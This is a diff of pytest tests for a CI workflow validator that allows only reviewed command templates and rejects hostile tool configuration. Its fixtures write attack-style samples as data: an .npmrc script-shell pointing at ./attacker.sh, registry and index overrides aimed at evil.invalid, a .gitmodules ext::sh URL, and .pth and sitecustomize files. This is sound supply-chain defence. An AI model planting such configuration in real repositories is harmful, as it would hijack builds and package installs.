@@ -29,6 +29,7 @@ import workflow_grammar
 from workflow_grammar import (
     PWSH_BODIES,
     TEMPLATES,
+    configuration_violations,
     script_violations,
     split_commands,
     workflow_violations,
@@ -668,11 +669,253 @@ def test_the_smoke_script_hand_off_is_this_jobs_wheel_and_lock(tmp_path: Path) -
         assert _verdict(tmp_path, _HAND_OFF.replace(old, changed, 1)), changed
 
 
-def test_powershell_bodies_compare_without_case(tmp_path: Path) -> None:
-    """PowerShell is case-insensitive; so is the match, and nothing else is installable."""
-    bootstrap = next(iter(PWSH_BODIES))
-    body = "\n".join(f"          {line}" for line in bootstrap.upper().splitlines())
-    assert _verdict(tmp_path, f"      - shell: pwsh\n        run: |\n{body}") == []
+def _pwsh_step(body: str) -> str:
+    indented = "\n".join(f"          {line}" for line in body.splitlines())
+    return f"      - shell: pwsh\n        run: |\n{indented}"
+
+
+def test_powershell_bodies_match_exactly(tmp_path: Path) -> None:
+    """Exact, so no case or spacing variant of anything is accepted (Sol r4 N1)."""
+    fetch = next(iter(PWSH_BODIES))
+    assert _verdict(tmp_path, _pwsh_step(fetch)) == []
+    assert _verdict(tmp_path, _pwsh_step(fetch.upper()))
+    # Sol r4 probe pwsh_joined_statements: one statement where the reviewed body has two.
+    assert _verdict(tmp_path, _pwsh_step(" ".join(fetch.splitlines())))
+
+
+def test_no_reviewed_powershell_body_installs_a_module() -> None:
+    """Sol r4 B4: PSScriptAnalyzer is pinned by its package's SHA-256, never installed."""
+    for body in PWSH_BODIES:
+        lowered = body.lower()
+        for installer in ("install-module", "install-psresource", "install-package", "iex"):
+            assert installer not in lowered.split(), (installer, body)
+        assert "install-module" not in lowered and "set-psrepository" not in lowered
+    (fetch,) = [body for body in PWSH_BODIES if "Invoke-WebRequest" in body]
+    assert "'14E634C828EB98EFB9F40B2918BA90F139ED5ECCDF663A2A747736D996995D60'" in fetch
+    assert fetch.index("Get-FileHash") < fetch.index("Expand-Archive")
+    assert "throw" in fetch
+    ci = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
+    analyzer = ci.split("- name: PSScriptAnalyzer\n", 1)[1]
+    assert "Import-Module (Join-Path $env:RUNNER_TEMP 'psscriptanalyzer/module/" in analyzer
+
+
+# Sol r4 B1: the reviewed spelling only. Quotes and escapes change what a word means.
+def _spellings(token: str) -> set[str]:
+    prefix, value = "", token
+    match = re.match(r"^[A-Za-z_][A-Za-z0-9_]*\+?=", token)
+    if match:
+        prefix, value = token[: match.end()], token[match.end() :]
+    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
+        inner = value[1:-1]
+    else:
+        inner = value
+    escaped = inner.replace("$", "\\$")
+    variants = {inner, f"'{inner}'", f'"{inner}"', f"$'{inner}'", escaped, f'"{escaped}"'}
+    return {prefix + variant for variant in variants} - {token}
+
+
+def _variable_bearing() -> list[tuple[workflow_grammar.Template, int]]:
+    return [
+        (template, index)
+        for template in TEMPLATES
+        for index, token in enumerate(template.tokens)
+        if "$" in token
+    ]
+
+
+class _EverythingHolds(workflow_grammar.Context):
+    def holds(self, fact: str, block: tuple[int, ...]) -> bool:
+        return True
+
+
+def test_every_variable_bearing_template_matches_only_its_reviewed_quoting() -> None:
+    checked = 0
+    for template, index in _variable_bearing():
+        scope = sorted(template.scopes)[0]
+        reviewed = " ".join(template.tokens).replace("@VENV@", "/tmp/smoke-venv")
+        commands = split_commands(reviewed.replace("@TEXT*@", "x"), closed=False)
+        ctx = _EverythingHolds(scope=scope)
+        # The control: the reviewed spelling itself passes this same harness.
+        assert list(workflow_grammar.violations(commands[-1:], where="probe", ctx=ctx)) == []
+        for spelling in _spellings(template.tokens[index]):
+            tokens = list(template.tokens)
+            tokens[index] = spelling
+            text = " ".join(tokens).replace("@VENV@", "/tmp/smoke-venv").replace("@TEXT*@", "x")
+            try:
+                commands = split_commands(text, closed=False)
+            except workflow_grammar.GrammarError:
+                continue
+            ctx = _EverythingHolds(scope=scope)
+            problems = list(workflow_grammar.violations(commands, where="probe", ctx=ctx))
+            assert problems, (template.tokens, spelling)
+            checked += 1
+    assert checked > 400, checked
+
+
+def test_single_quoted_reviewed_values_are_refused(tmp_path: Path) -> None:
+    """Sol r4 probes single_quoted_locked and single_quoted_smoke_wheel, verbatim."""
+    locked = (
+        "      - run: |\n          mkdir -p $RUNNER_TEMP/locked\n"
+        "          LOCKED='$RUNNER_TEMP/locked'\n"
+        "          uv export --locked --no-default-groups --no-emit-project --format"
+        ' requirements.txt --output-file "$RUNNER_TEMP/locked/requirements-lock.txt"\n'
+        "          python -m venv /tmp/smoke-venv\n"
+        "          /tmp/smoke-venv/bin/pip install --require-hashes"
+        ' -r "$LOCKED/requirements-lock.txt"'
+    )
+    assert any("LOCKED='$RUNNER_TEMP/locked'" in problem for problem in _verdict(tmp_path, locked))
+    wheel = _HAND_OFF.replace('GPO_STUDIO_WHEEL="$WHEEL"', "GPO_STUDIO_WHEEL='$WHEEL'")
+    assert any("GPO_STUDIO_WHEEL='$WHEEL'" in problem for problem in _verdict(tmp_path, wheel))
+    reviewed = locked.replace("LOCKED='$RUNNER_TEMP/locked'", 'LOCKED="$RUNNER_TEMP/locked"')
+    reviewed = reviewed.replace("mkdir -p $RUNNER_TEMP/locked", 'mkdir -p "$RUNNER_TEMP/locked"')
+    assert _verdict(tmp_path, reviewed) == []
+
+
+# Sol r4 B2: a fact comes only from a command whose failure would fail the job.
+UNENFORCED_PROVIDERS = {
+    "npm_ci_or_true": "      - run: |\n          npm ci || true\n          {use}",
+    "npm_ci_continue_on_error": (
+        "      - run: npm ci\n        continue-on-error: true\n      - run: {use}"
+    ),
+    "npm_ci_skipped_shell_branch": (
+        "      - run: |\n          if [ ! -s sbom.cdx.json ]; then\n            npm ci\n"
+        "          fi\n          {use}"
+    ),
+    "npm_ci_if_step": (
+        "      - if: github.event_name == 'push'\n        run: npm ci\n      - run: {use}"
+    ),
+    "npm_ci_and_list": "      - run: |\n          npm ci && true\n          {use}",
+    "npm_ci_pipeline": "      - run: |\n          npm ci | cat\n          {use}",
+    "npm_ci_background": "      - run: |\n          npm ci &\n          {use}",
+    "npm_ci_negated": "      - run: |\n          ! npm ci\n          {use}",
+    "npm_ci_condition": "      - run: |\n          if npm ci; then true; fi\n          {use}",
+    "npm_ci_subshell": "      - run: |\n          ( npm ci )\n          {use}",
+    "npm_ci_loop": (
+        "      - run: |\n          for attempt in $(seq 1 20); do npm ci; done\n          {use}"
+    ),
+}
+_NPX = "npx playwright install --with-deps chromium firefox"
+
+
+@pytest.mark.parametrize("name", sorted(UNENFORCED_PROVIDERS))
+def test_a_provider_whose_failure_is_tolerated_establishes_nothing(
+    name: str, tmp_path: Path
+) -> None:
+    steps = UNENFORCED_PROVIDERS[name].format(use=_NPX)
+    assert any("npm-ci" in problem for problem in _verdict(tmp_path, steps)), name
+
+
+def test_tolerated_exports_and_builds_establish_nothing(tmp_path: Path) -> None:
+    export = (
+        "uv export --locked --no-default-groups --no-emit-project --format requirements.txt"
+        " --output-file requirements-lock.txt"
+    )
+    install = (
+        "python -m venv /tmp/wheel-venv\n"
+        "          /tmp/wheel-venv/bin/pip install --require-hashes -r requirements-lock.txt"
+    )
+    tolerated = f"      - run: |\n          {export} || true\n          {install}"
+    assert any("lock:requirements-lock.txt" in p for p in _verdict(tmp_path, tolerated))
+    skipped = f"      - if: always()\n        run: {export}\n      - run: |\n          {install}"
+    assert any("lock:requirements-lock.txt" in p for p in _verdict(tmp_path, skipped))
+    build = "uv run --locked --only-group release python -m build --no-isolation --outdir dist"
+    wheel = (
+        "python -m venv /tmp/smoke-venv\n"
+        "          /tmp/smoke-venv/bin/pip install --no-deps --no-index dist/gpo_studio-*.whl"
+    )
+    branch = (
+        f"      - run: |\n          if [ ! -s sbom.cdx.json ]; then\n            {build}\n"
+        f"          fi\n          {wheel}"
+    )
+    assert any("'dist'" in p for p in _verdict(tmp_path, branch))
+    assert _verdict(tmp_path, f"      - run: {build}\n      - run: |\n          {wheel}") == []
+
+
+def test_a_fact_holds_inside_the_block_that_established_it(tmp_path: Path) -> None:
+    """The smoke script builds inside an else branch and uses the result there."""
+    inside = (
+        "      - run: |\n          if [ ! -s sbom.cdx.json ]; then\n            npm ci\n"
+        f"            {_NPX}\n          fi"
+    )
+    assert _verdict(tmp_path, inside) == []
+
+
+def test_a_project_npmrc_is_refused(tmp_path: Path) -> None:
+    """Sol r4 probe npmrc_script_shell: script-shell replaces every script's shell."""
+    package = tmp_path / "package.json"
+    package.write_text(
+        json.dumps({"name": "probe", "version": "1.0.0", "scripts": {"test:unit": "vitest run"}}),
+        encoding="utf-8",
+    )
+    (tmp_path / ".npmrc").write_text("script-shell=./attacker.sh\n", encoding="utf-8")
+    workflow = tmp_path / "probe.yml"
+    steps = "      - run: npm ci\n      - run: npm run test:unit"
+    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
+    problems = workflow_violations(workflow, root=tmp_path, package_json=package)
+    assert any(".npmrc" in problem for problem in problems)
+    (tmp_path / ".npmrc").unlink()
+    assert workflow_violations(workflow, root=tmp_path, package_json=package) == []
+
+
+def test_no_tracked_file_configures_the_tools_the_templates_run() -> None:
+    assert configuration_violations() == []
+
+
+def _repository(tmp_path: Path, files: dict[str, str]) -> Path:
+    import subprocess
+
+    for name, text in {
+        "pyproject.toml": (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8"),
+        "package.json": (REPO_ROOT / "package.json").read_text(encoding="utf-8"),
+        **files,
+    }.items():
+        path = tmp_path / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text, encoding="utf-8")
+    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
+    subprocess.run(["git", "-C", str(tmp_path), "add", "-A"], check=True)
+    return tmp_path
+
+
+TRACKED_CONFIGURATION = {
+    "npmrc": {".npmrc": "script-shell=./attacker.sh\n"},
+    "nested_npmrc": {"tests/frontend/.npmrc": "registry=https://evil.invalid\n"},
+    "pip_conf": {"pip.conf": "[global]\nindex-url = https://evil.invalid\n"},
+    "uv_toml": {"uv.toml": 'index-url = "https://evil.invalid"\n'},
+    "sitecustomize": {"scripts/sitecustomize.py": "import os\n"},
+    "pth": {"scripts/evil.pth": "import os\n"},
+    "python_version": {".python-version": "3.15\n"},
+    "gitmodules": {".gitmodules": '[submodule "x"]\n\turl = ext::sh /tmp/p\n'},
+    "root_conftest": {"conftest.py": "import os\n"},
+    "curlrc": {".curlrc": "url = https://evil.invalid\n"},
+    "yarnrc": {".yarnrc.yml": "npmRegistryServer: https://evil.invalid\n"},
+    "node_modules_shim": {"node_modules/.bin/playwright": "#!/bin/sh\n"},
+    "prebuilt_dist": {"dist/gpo_studio-1.0-py3-none-any.whl": "x"},
+    "dollar_path": {"$RUNNER_TEMP/locked/requirements-lock.txt": "roguepkg==1.0\n"},
+    "tool_uv_index": {
+        "pyproject.toml": (REPO_ROOT / "pyproject.toml")
+        .read_text(encoding="utf-8")
+        .replace("[tool.uv]\n", '[tool.uv]\nindex-url = "https://evil.invalid"\n'),
+    },
+    "package_manager": {
+        "package.json": json.dumps(
+            {
+                **json.loads((REPO_ROOT / "package.json").read_text(encoding="utf-8")),
+                "packageManager": "yarn@4.0.0",
+            }
+        ),
+    },
+}
+
+
+@pytest.mark.parametrize("name", sorted(TRACKED_CONFIGURATION))
+def test_a_tracked_tool_configuration_is_refused(name: str, tmp_path: Path) -> None:
+    root = _repository(tmp_path, TRACKED_CONFIGURATION[name])
+    assert configuration_violations(root), name
+
+
+def test_the_configuration_control_repository_is_clean(tmp_path: Path) -> None:
+    assert configuration_violations(_repository(tmp_path, {"tests/conftest.py": "x = 1\n"})) == []
 
 
 NPM_SCRIPT_VARIANTS = {
